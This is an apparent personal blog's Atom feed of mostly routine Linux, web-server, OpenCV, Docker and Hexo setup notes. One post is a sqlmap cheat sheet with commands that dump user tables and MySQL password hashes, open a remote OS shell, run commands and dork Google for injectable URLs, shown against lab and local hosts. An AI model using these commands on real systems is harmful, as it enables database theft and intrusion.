<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Codes of huaring</title>
  
  <subtitle>LITHIUMICE</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hualin.online/"/>
  <updated>2019-09-12T14:45:52.147Z</updated>
  <id>https://hualin.online/</id>
  
  <author>
    <name>lithiumice</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>some informations</title>
    <link href="https://hualin.online/some-informations/"/>
    <id>https://hualin.online/some-informations/</id>
    <published>2019-09-12T14:44:56.000Z</published>
    <updated>2019-09-12T14:45:52.147Z</updated>
    
    <content type="html"><![CDATA[<p>个人整理的编程、大学资料、文学等的书籍<br>存在百度云里，可自行转存<br><a href="https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA" target="_blank" rel="noopener">https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA</a> 提取码: mc5d <a href="https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA" target="_blank" rel="noopener">https://pan.baidu.com/s/1wAzs6cNdvPH34LnRC-8lKA</a> 提取码: ty5e</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;个人整理的编程、大学资料、文学等的书籍&lt;br&gt;存在百度云里，可自行转存&lt;br&gt;&lt;a href=&quot;https://pan.baidu.com/s/1CPx9pbOlVSYdFYNxH3dTmA&quot; target=&quot;_blank&quot;
        
      
    
    </summary>
    
    
      <category term="资料" scheme="https://hualin.online/tags/%E8%B5%84%E6%96%99/"/>
    
  </entry>
  
  <entry>
    <title>some thoughts</title>
    <link href="https://hualin.online/some-thoughts/"/>
    <id>https://hualin.online/some-thoughts/</id>
    <published>2019-09-12T14:44:37.000Z</published>
    <updated>2019-09-12T14:45:37.004Z</updated>
    
    <content type="html"><![CDATA[<p>从很久以前开始，看完了一本书，一部动漫，一部电影，无论它的结局是喜悦还是悲伤的，我总会感到怅然若失，就像告别了一个挚友，经历了一段波澜起伏的人生，因而突发一种沧桑感，经历了一个不愿醒来的梦境，梦醒时却发觉自己仍在原地。</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;从很久以前开始，看完了一本书，一部动漫，一部电影，无论它的结局是喜悦还是悲伤的，我总会感到怅然若失，就像告别了一个挚友，经历了一段波澜起伏的人生，因而突发一种沧桑感，经历了一个不愿醒来的梦境，梦醒时却发觉自己仍在原地。&lt;/p&gt;

        
      
    
    </summary>
    
    
      <category term="随感 杂感" scheme="https://hualin.online/tags/%E9%9A%8F%E6%84%9F-%E6%9D%82%E6%84%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux skills</title>
    <link href="https://hualin.online/linux-skills/"/>
    <id>https://hualin.online/linux-skills/</id>
    <published>2019-09-12T14:31:18.000Z</published>
    <updated>2019-09-12T14:46:52.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用命令压缩图片"><a href="#使用命令压缩图片" class="headerlink" title="使用命令压缩图片"></a>使用命令压缩图片</h2><p>安装<code>sudo pacman -S imagemagick</code><br>支持JPG, BMP, PCX, GIF, PNG, TIFF, XPM和XWD等</p><p>1.转换格式<code>convert 1.jpg 1.png</code><br>2.-resize 1080x780<br>3.-sample 50%x50%<br>4.-rotate 272<br>5.-fill black -pointsize 60 -front helvetica -draw ‘hello’ //front use Ghostscript<br>5.-quality 0-100</p><h3 id="批量转换"><a href="#批量转换" class="headerlink" title="批量转换"></a>批量转换</h3><p><code>for %f in (*.jpg) do convert &quot;%f&quot; &quot;%~nf.png&quot;</code><br><code>for %f in (*.jpg) do convertv -quality 70 &quot;%f&quot; &quot;%~nf.jpg&quot;</code><br><code>convert -quality 70 *.jpg</code><br>composite加水印</p><h2 id="Linux-设置swap分区"><a href="#Linux-设置swap分区" class="headerlink" title="Linux 设置swap分区"></a>Linux 设置swap分区</h2><pre><code>dd if=/dev/zero of=/mnt/swap bs=1m count=1024 #1Gmkswap /mnt/swapswapon /mnt/swaphostnamectl set-hostname mail.ewomail.cnhttps://github.com/gyxuehu/EwoMail.gitsh ./start.sh ewomail.cn -f</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;使用命令压缩图片&quot;&gt;&lt;a href=&quot;#使用命令压缩图片&quot; class=&quot;headerlink&quot; title=&quot;使用命令压缩图片&quot;&gt;&lt;/a&gt;使用命令压缩图片&lt;/h2&gt;&lt;p&gt;安装&lt;code&gt;sudo pacman -S
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>watermark</title>
    <link href="https://hualin.online/watermark/"/>
    <id>https://hualin.online/watermark/</id>
    <published>2019-09-12T14:30:25.000Z</published>
    <updated>2019-09-12T14:31:02.423Z</updated>
    
    <content type="html"><![CDATA[<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> glob<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageDraw<span class="token keyword">from</span> PIL <span class="token keyword">import</span> ImageFont<span class="token keyword">def</span> <span class="token function">watermark</span><span class="token punctuation">(</span>post_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> post_name <span class="token operator">==</span> <span class="token string">'all'</span><span class="token punctuation">:</span>        post_name <span class="token operator">=</span> <span class="token string">'*'</span>    dir_name <span class="token operator">=</span> <span class="token string">'source/_posts/'</span> <span class="token operator">+</span> post_name <span class="token operator">+</span> <span class="token string">'/*'</span>    <span class="token keyword">for</span> files <span class="token keyword">in</span> glob<span class="token punctuation">.</span>glob<span class="token punctuation">(</span>dir_name<span class="token punctuation">)</span><span class="token punctuation">:</span>        im <span class="token operator">=</span> Image<span class="token punctuation">.</span>open<span class="token punctuation">(</span>files<span class="token punctuation">)</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>im<span class="token punctuation">.</span>getbands<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>            im <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>files<span class="token punctuation">)</span>        font <span class="token operator">=</span> ImageFont<span class="token punctuation">.</span>truetype<span class="token punctuation">(</span><span class="token string">'STSONG.TTF'</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span>        draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                  u<span class="token string">'@lithiumice'</span><span class="token punctuation">,</span> fill<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>files<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        watermark<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[usage] &lt;input>'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;pre class=&quot;line-numbers language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot; spellcheck=&quot;true&quot;&gt;# -*- coding: utf-8
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>install flarum</title>
    <link href="https://hualin.online/install-flarum/"/>
    <id>https://hualin.online/install-flarum/</id>
    <published>2019-09-12T14:19:30.000Z</published>
    <updated>2019-09-12T14:19:44.556Z</updated>
    
    <content type="html"><![CDATA[<h2 id="test-flarum"><a href="#test-flarum" class="headerlink" title="test flarum"></a>test flarum</h2><p><a href="https://github.com/flarum/flarum.git" target="_blank" rel="noopener">github</a></p><p>1.install composer:<br><code>composer create-project flarum/flarum . --stability=beta</code><br>2.in order to use php</p><pre><code>sudo apt-get -y install gcc make autoconf libc-dev pkg-configsudo apt-get -y install php7.2-devsudo apt-get -y install libmcrypt-devsudo pecl install mcrypt-1.0.2 //for php&gt;7.3</code></pre><p>3.for arch<br><code>extra/php-sodium</code><br><code>php-set = extension=sodium</code>in /etc/php/php.ini</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;test-flarum&quot;&gt;&lt;a href=&quot;#test-flarum&quot; class=&quot;headerlink&quot; title=&quot;test flarum&quot;&gt;&lt;/a&gt;test flarum&lt;/h2&gt;&lt;p&gt;&lt;a
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqmap simple intro</title>
    <link href="https://hualin.online/sqmap-simple-intro/"/>
    <id>https://hualin.online/sqmap-simple-intro/</id>
    <published>2019-09-12T14:14:36.000Z</published>
    <updated>2019-09-12T14:15:35.439Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre><code>./sqlmap.py -u &quot;http://localhost:88/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; –cookie=mycookice.txt –batch./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user –columns./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D sql_inject_demo -T t_user -C ‘username, passwd’ –dump./sqlmap.py -u &quot;http://192.168.3.64:8080/user/login?username=foo&amp;passwd=bar&quot; –batch -D mysql -T user -C ‘user, authentication_string’ –dump./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-shell // 获取远程主机的shell./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –os-cmd=&quot;whoami&quot; // 执行远程主机的命令./sqlmap.py -u &quot;http://127.0.0.1/index.php?id=1&quot; –is-dba // 检查DBMS用户是否为DBA./sqlmap.py -g &quot;inurl:php?id=&quot; // 通过google寻找url带有php?id=字段的地址</code></pre><p><strong>参数解析</strong><br>–batch –dbs //showdatabases<br>–batch –current-db //showcurrentdb<br>–batch -D database -T user -C varchar–tables //showtables<br>–columns //showcolumns<br>–tables //thesame</p><p><strong>以GET方式的cookice形式:</strong><br>_ga=GA1.1.1240902680.1567156892; portainer.datatable_text_filter_home_endpoints=; PHPSESSID=r56dp5dsqrc9rmjq74k85m4jd1; security=low</p><p><strong>POST注入方式:</strong><br>$ python sqlmap.py -r header.txt –dbs<br>// -r是从一个文件中载入HTTP请求<br>// 其余都与GET一样将-u部分改成-r header.txt<br>从chrome保存下来的request header:<br>POST /index.php HTTP/1.1 …</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;常用命令&quot;&gt;&lt;a href=&quot;#常用命令&quot; class=&quot;headerlink&quot; title=&quot;常用命令&quot;&gt;&lt;/a&gt;常用命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;./sqlmap.py -u
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>use nvm</title>
    <link href="https://hualin.online/use-nvm/"/>
    <id>https://hualin.online/use-nvm/</id>
    <published>2019-09-11T13:59:05.000Z</published>
    <updated>2019-09-11T13:59:05.492Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>install opencv on linux</title>
    <link href="https://hualin.online/install-opencv-on-linux/"/>
    <id>https://hualin.online/install-opencv-on-linux/</id>
    <published>2019-09-11T13:57:53.000Z</published>
    <updated>2019-09-11T14:02:42.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="simple-guide-to-install-opencv-on-ubuntu"><a href="#simple-guide-to-install-opencv-on-ubuntu" class="headerlink" title="simple guide to install opencv on ubuntu"></a>simple guide to install opencv on ubuntu</h1><h2 id="system-depandencies"><a href="#system-depandencies" class="headerlink" title="system depandencies"></a>system depandencies</h2><pre><code>sudo apt-get install build-essentialsudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-devsudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</code></pre><h2 id="build-opencv"><a href="#build-opencv" class="headerlink" title="build opencv"></a>build opencv</h2><pre><code>git clone https://github.com/opencv/opencv.gitgit clone https://github.com/opencv/opencv_contrib.gitcd opencvmkdir build &amp;&amp; cd buildcmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..cmake -DCMAKE_INSTALL_PREFIX=/usr-DCMAKE_BUILD_TYPE=Release-DENABLE_CXX11=ON-DBUILD_PERF_TESTS=OFF-DWITH_XINE=ON-DBUILD_TESTS=OFF-DENABLE_PRECOMPILED_HEADERS=OFF-DCMAKE_SKIP_RPATH=ON-DBUILD_WITH_DEBUG_INFO=OFF-DBUILD_SHARED_LIBS=OFF-Wno-dev .. &amp;&amp; makecd opencv/build/doc/make -j7 html_docssudo make installgit clone https://github.com/opencv/opencv_extra.gitpkg-config –modversion opencv</code></pre><pre><code>## Description of some parametersbuild type: CMAKE_BUILD_TYPE=ReleaseDebugto build with modules from opencv_contrib set OPENCV_EXTRA_MODULES_PATH to &lt;path to opencv_contrib/modules/&gt;set BUILD_DOCS for building documentsset BUILD_EXAMPLES to build all examples[optional] Building python. Set the following python parameters:PYTHON2(3)_EXECUTABLE = &lt;path to python&gt;PYTHON_INCLUDE_DIR = /usr/include/python&lt;version&gt;PYTHON_INCLUDE_DIR2 = /usr/include/x86_64-linux-gnu/python&lt;version&gt;PYTHON_LIBRARY = /usr/lib/x86_64-linux-gnu/libpython&lt;version&gt;.soPYTHON2(3)_NUMPY_INCLUDE_DIRS = /usr/lib/python&lt;version&gt;/dist-packages/numpy/core/include/[optional] Building java.Unset parameter: BUILD_SHARED_LIBSIt is useful also to unset BUILD_EXAMPLES, BUILD_TESTS, BUILD_PERF_TESTS – as they all will be statically linked with OpenCV and can take a lot of memory.</code></pre><h2 id="test-your-opencv"><a href="#test-your-opencv" class="headerlink" title="test your opencv"></a>test your opencv</h2><pre><code>g++ -o main /home/lithium/Documents/opencv-lena.cpp `pkg-config opencv –cflags –libs`sudo apt-get install libopencv-dev## uninstall opencvsudo rm -r /usr/local/include/opencv2 /usr/local/include/opencv /usr/include/opencv /usr/include/opencv2 /usr/local/share/opencv /usr/local/share/OpenCV /usr/share/opencv /usr/share/OpenCV /usr/local/bin/opencv* /usr/local/lib/libopencv*sudo apt-get –purge remove opencv-doc opencv-data python-opencv</code></pre><h2 id="config-PATH"><a href="#config-PATH" class="headerlink" title="config PATH"></a>config PATH</h2><pre><code>CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/include/libxml2:/usr/local/include/opencv4/opencv2export CPLUS_INCLUDE_PATHC_INCLUDE_PATH=/usr/include/libxml2:/usr/local/include/opencv4/opencv2/export C_INCLUDE_PATHLD_LIBRARY_PATH=$LD_LIBRARY_PATH:/MyLibexport LD_LIBRARY_PATHLIBRARY_PATH=$LIBRARY_PATH:/MyLibexport LIBRARY_PATH</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h1 id=&quot;simple-guide-to-install-opencv-on-ubuntu&quot;&gt;&lt;a href=&quot;#simple-guide-to-install-opencv-on-ubuntu&quot; class=&quot;headerlink&quot; title=&quot;simple
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>apache-php-config</title>
    <link href="https://hualin.online/apache-php-config/"/>
    <id>https://hualin.online/apache-php-config/</id>
    <published>2019-09-10T13:12:03.000Z</published>
    <updated>2019-09-10T13:24:52.532Z</updated>
    
    <content type="html"><![CDATA[<p>vim /usr/local/apache2/conf/httpd.conf<br><directory><br>    Options FollowSymLinks<br>    AllowOverride None<br>    Order deny,allow<br>    Deny from all<br></directory></p><p>AddType application/x-gzip .gz .tgz<br>在其下面添加：<br>ddType application/x-httpd-php .php</p><ifmodule dir_module>    DirectoryIndex index.html//DirectoryIndex index.html index.htm index.php</ifmodule><p>ServerName localhost:80<br>/usr/local/apache2/bin/apachectl -t</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;p&gt;vim /usr/local/apache2/conf/httpd.conf&lt;br&gt;&lt;directory&gt;&lt;br&gt;    Options FollowSymLinks&lt;br&gt;    AllowOverride None&lt;br&gt;    Order
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>install nodebb</title>
    <link href="https://hualin.online/install-nodebb/"/>
    <id>https://hualin.online/install-nodebb/</id>
    <published>2019-09-10T06:12:31.000Z</published>
    <updated>2019-09-12T15:56:59.458Z</updated>
    
    <content type="html"><![CDATA[<h2 id="For-Centos"><a href="#For-Centos" class="headerlink" title="For Centos"></a>For Centos</h2><pre><code>yum -y install epel-release //for centos 7yum -y groupinstall &quot;Development Tools&quot;yum -y install git redis ImageMagick npmcurl https://raw.githubusercontent.com/creationix/nvm/v0.13.1/install.sh | bash$ export NVM_DIR=&quot;$HOME/.nvm&quot;[ -s &quot;$NVM_DIR/nvm.sh&quot; ] &amp;&amp; . &quot;$NVM_DIR/nvm.sh&quot;source ~/.bash_profilenvm list-remotenvm install v0.12.7 # as of this writing check the result of the list-remote to see all choices//use v6.9.5 as stable$ export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node$ export NVM_IOJS_ORG_MIRROR=http://npm.taobao.org/mirrors/iojssudo npm config set registry http://registry.npm.taobao.org/systemctl start redissystemctl enable rediscd /path/to/nodebb/install/locationgit clone -b v1.10.x https://github.com/NodeBB/NodeBB nodebbcd nodebb./nodebb setupfirewall-cmd --zone=public --add-port=4567/tcp --permanent//or  --add-service=httpfirewall-cmd --reload./nodebb start</code></pre><p>if you come across <strong>open ‘/opt/nodebb/node_modules/sharp/</strong>,then try:</p><pre><code>npm install./nodebb setup</code></pre><h2 id="For-arch"><a href="#For-arch" class="headerlink" title="For arch"></a>For arch</h2><pre><code> sudo pacman -S git nodejs npm redis imagemagick icu git clone -b v1.10.x https://github.com/NodeBB/NodeBB.git nodebb cd nodebb ./nodebb setup ./nodebb start</code></pre><h2 id="proxy-reverse"><a href="#proxy-reverse" class="headerlink" title="proxy reverse"></a>proxy reverse</h2><pre><code>in httd.confLoadModule proxy_module /usr/lib/apache2/modules/mod_proxy.soLoadModule proxy_http_module /usr/lib/apache2/modules/mod_proxy_http.so&lt;VirtualHost *:80&gt;             DocumentRoot &quot;/home/test/tomcat/webapps/ROOT”             ServerName test.test.test             ProxyPass /    http://127.0.0.1:8080/        ProxyPassReverse /   http://127.0.0.1:8080/&lt;/VirtualHost&gt;in apache2.configurationInclude ports.confInclude httpd.confServerName 127.0.0.1sudo apache2ctl -k stopsudo apache2ctl -k start</code></pre><h2 id="nginx-ProxyPassReverse"><a href="#nginx-ProxyPassReverse" class="headerlink" title="nginx ProxyPassReverse"></a>nginx ProxyPassReverse</h2><pre><code>Insert the below lines into the location / {} segment:  ##########################################  server {      listen 80;      server_name www.xxx.com; # 你的域名     location / {          proxy_set_header X-Real-IP $remote_addr;          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;          proxy_set_header X-Forwarded-Proto $scheme;          proxy_set_header Host $http_host;          proxy_set_header X-NginX-Proxy true;          proxy_pass http://127.0.0.1:4567;          proxy_http_version 1.1;          proxy_set_header X-Real-IP $remote_addr;          proxy_set_header Host $host;          proxy_set_header Upgrade $http_upgrade;          proxy_set_header Connection &#39;upgrade&#39;;          proxy_cache_bypass $http_upgrade;          proxy_redirect off;          # Socket.IO Support          proxy_http_version 1.1;          proxy_set_header Upgrade $http_upgrade;          proxy_set_header Connection &quot;upgrade&quot;;      }      # 配置 502 页? 参考: 高级 - 配置 Nginx  }  ##########################################</code></pre><h2 id="use-forever-to-manage-NodeBB"><a href="#use-forever-to-manage-NodeBB" class="headerlink" title="use forever to manage NodeBB"></a>use <strong>forever</strong> to manage NodeBB</h2><p>npm install forever -g<br> forever start app.js</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;For-Centos&quot;&gt;&lt;a href=&quot;#For-Centos&quot; class=&quot;headerlink&quot; title=&quot;For Centos&quot;&gt;&lt;/a&gt;For Centos&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;yum -y install epel-release
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>using hexo</title>
    <link href="https://hualin.online/using-hexo/"/>
    <id>https://hualin.online/using-hexo/</id>
    <published>2019-09-10T04:57:01.000Z</published>
    <updated>2019-09-12T14:22:34.628Z</updated>
    
    <content type="html"><![CDATA[<ul><li><h2 id="在本机上安装"><a href="#在本机上安装" class="headerlink" title="在本机上安装"></a>在本机上安装</h2><pre><code>sudo pacman -S gem bundlesudo gem install bundler jekyllbundle exec jekyll servenpm install hexohexo init blog &amp;amp;&amp;amp; cd blognpm i hexo-generator-json-content --save &amp;amp;&amp;amp; npm i hexo-wordcount --save</code></pre></li><li><h2 id="使用主题"><a href="#使用主题" class="headerlink" title="使用主题"></a>使用主题</h2><p>获取 Archer 主题：<br>git clone “<a href="https://github.com/fi3ework/hexo-theme-archer.git&quot;" target="_blank" rel="noopener">https://github.com/fi3ework/hexo-theme-archer.git&quot;</a> themes/archer<br>覆盖 Hexo 默认配置文件：<br>cp ../hexo.config.yml _config.yml<br>覆盖 Archer 主题默认配置文件：<br>cp ../hexo.config-theme.archer.yml themes/archer/_config.yml<br>加入定制的页面布局：<br>cp ../post-footer.ejs themes/archer/layout/_partial/post-footer.ejs</p></li><li><h2 id="安装-Hexo-站点："><a href="#安装-Hexo-站点：" class="headerlink" title="安装 Hexo 站点："></a>安装 Hexo 站点：</h2><p>npm install<br>使用hexo new [layout] &lt;title&gt;命令来创建一个文章，也可以手动把写好的文章拷贝到源目录(/docs/_posts/)中。<br>执行 hexo generate</p></li></ul><ul><li><h2 id="git-and-hexo"><a href="#git-and-hexo" class="headerlink" title="git and hexo"></a>git and hexo</h2><pre><code>git config --global core.autocrlf falseuseradd gitpasswd git // 设置密码su git // 这步很重要，不切换用户后面会很麻烦cd /home/git/mkdir -p projects/blog // 项目存在的真实目录mkdir repos &amp;&amp; cd reposgit init --bare blog.git // 创建一个裸露的仓库cd blog.git/hooksvi post-receive // 创建hook钩子函数，输入了内容如下（原理可以参考上面的链接）#!/bin/shgit --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -fchmod +x post-receiveexit // 退出到 root 登录chown -R git:git /home/git/repos/blog.git // 添加权限cat /etc/shells // 查看`git-shell`是否在登录方式里面，有则跳过which git-shell // 查看是否安装vi /etc/shells</code></pre><pre><code>git clone git@47.102.85.59:/home/git/repos/blog.gitssh-copy-id -i /home/lithium/.ssh/id_rsa.pub git@47.102.85.59ssh git@47.102.85.59</code></pre></li><li><h2 id="动漫图片"><a href="#动漫图片" class="headerlink" title="动漫图片"></a>动漫图片</h2>npm install –save hexo-helper-live2d<br>npm install –save live2d-widget-model-shizuku</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;ul&gt;
&lt;li&gt;&lt;h2 id=&quot;在本机上安装&quot;&gt;&lt;a href=&quot;#在本机上安装&quot; class=&quot;headerlink&quot; title=&quot;在本机上安装&quot;&gt;&lt;/a&gt;在本机上安装&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo pacman -S gem bundle
sudo gem
        
      
    
    </summary>
    
    
      <category term="Codes" scheme="https://hualin.online/tags/Codes/"/>
    
  </entry>
  
  <entry>
    <title>docker command translation</title>
    <link href="https://hualin.online/docker-command-translation/"/>
    <id>https://hualin.online/docker-command-translation/</id>
    <published>2019-09-08T14:06:28.000Z</published>
    <updated>2019-09-12T14:14:02.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="useful-command"><a href="#useful-command" class="headerlink" title="useful command"></a>useful command</h2><pre><code>  docker run -d -p 5000:5000 training/webapp python app.py  docker logs -f bf08b7f2cd89(ID)  docker run -it ubuntu:15.10 /bin/bash  -f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。  -d:让容器在后台运行。  -P:将容器内部使用的网络端口映射到我们使用的主机上。  docker top wizardly_chandrasekhar  docker inspect wizardly_chandrasekhar  docker ps -l 查询最后一次创建的容器  docker images //like list images  docker commit -m=&amp;quot;has update&amp;quot; -a=&amp;quot;author&amp;quot; ID runoob/ubuntu:v2  docker top wizardly_chandrasekhar  docker inspect wizardly_chandrasekhar  docker run -d -p 5000:5000 training/webapp python app.py  docker logs -f bf08b7f2cd89(ID)  docker run -it ubuntu:15.10 /bin/bash  -f: 让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。  -d:让容器在后台运行。  -P:将容器内部使用的网络端口映射到我们使用的主机上。</code></pre><h2 id="main-command"><a href="#main-command" class="headerlink" title="main command"></a>main command</h2><pre><code>  attach    Attach to a running container //连接到一个正在运行的容器  build     Build an image from a Dockerfile //构建一个镜像  commit    Create a new image from a container&#39;s changes //更新镜像  cp        Copy files/folders between a container and the local filesystem //复制  create    Create a new container  diff      Inspect changes on a container&#39;s filesystem //检查容器文件系统的变化  events    Get real time events from the server  exec      Run a command in a running container//在容器中运行命令  export    Export a container&#39;s filesystem as a tar archive //以tar格式导出容器系统  history   Show the history of an image //历史  images    List images  import    Import the contents from a tarball to create a filesystem image //于export相反  info      Display system-wide information //显示主机信息  inspect   Return low-level information on a container, image or task  kill      Kill one or more ru  attach    Attach to a running container //连接到一个正在运行的容器  build     Build an image from a Dockerfile //构建一个镜像  commit    Create a new image from a container&#39;s changes //更新镜像  cp        Copy files/folders between a container and the local filesystem //复制  create    Create a new container  diff      Inspect changes on a container&#39;s filesystem //检查容器文件系统的变化  events    Get real time events from the server  exec      Run a command in a running container//在容器中运行命令  export    Export a container&#39;s filesystem as a tar archive //以tar格式导出容器系统  history   Show the history of an image //历史  images    List images  import    Import the contentsnning containers //杀死  load      Load an image from a tar archive or STDIN //加载文件系统  login     Log in to a Docker registry. //登录docker.org  logout    Log out from a Docker registry.  logs      Fetch the logs of a container  network   Manage Docker networks  node      Manage Docker Swarm nodes //docker集群  pause     Pause all processes within one or more containers //暂停  port      List port mappings or a specific mapping for the container //显示容器端口映射  ps        List containers  pull      Pull an image or a repository from a registry  push      Push an image or a repository to a registry  rename    Rename a container  restart   Restart a container  rm        Remove one or more containers  rmi       Remove one or more images  run       Run a command in a new container  save      Save one or more images to a tar archive (streamed to STDOUT by default)  search    Search the Docker Hub for images  service   Manage Docker services  start     Start one or more stopped containers  stats     Display a live stream of container(s) resource usage statistics  stop      Stop one or more running containers  swarm     Manage Docker Swarm  tag       Tag an image into a repository  top       Display the running processes of a container //在容器中运行top  unpause   Unpause all processes within one or more containers  update    Update configuration of one or more containers  version   Show the Docker version information  volume    Manage Docker volumes  wait      Block until a container stops, then print its exit code</code></pre><h2 id="subcommand"><a href="#subcommand" class="headerlink" title="subcommand"></a>subcommand</h2><pre><code>    --add-host value              Add a custom host-to-IP mapping (host:ip) (default [])    -a, --attach value                Attach to STDIN, STDOUT or STDERR (default [])    --blkio-weight value          Block IO (relative weight), between 10 and 1000    --blkio-weight-device value   Block IO weight (relative device weight) (default [])    --cap-add value               Add Linux capabilities (default [])    --cap-drop value              Drop Linux capabilities (default [])    --cgroup-parent string        Optional parent cgroup for the container    --cidfile string              Write the container ID to the file    --cpu-percent int             CPU percent (Windows only)    --cpu-period int              Limit CPU CFS (Completely Fair Scheduler) period    --cpu-quota int               Limit CPU CFS (Completely Fair Scheduler) quota-c, --cpu-shares int              CPU shares (relative weight)    --cpuset-cpus string          CPUs in which to allow execution (0-3, 0,1)    --cpuset-mems string          MEMs in which to allow execution (0-3, 0,1)-d, --detach                      Run container in background and print container ID    --detach-keys string          Override the key sequence for detaching a container    --device value                Add a host device to the container (default [])    --device-read-bps value       Limit read rate (bytes per second) from a device (default [])    --device-read-iops value      Limit read rate (IO per second) from a device (default [])    --device-write-bps value      Limit write rate (bytes per second) to a device (default [])    --device-write-iops value     Limit write rate (IO per second) to a device (default [])    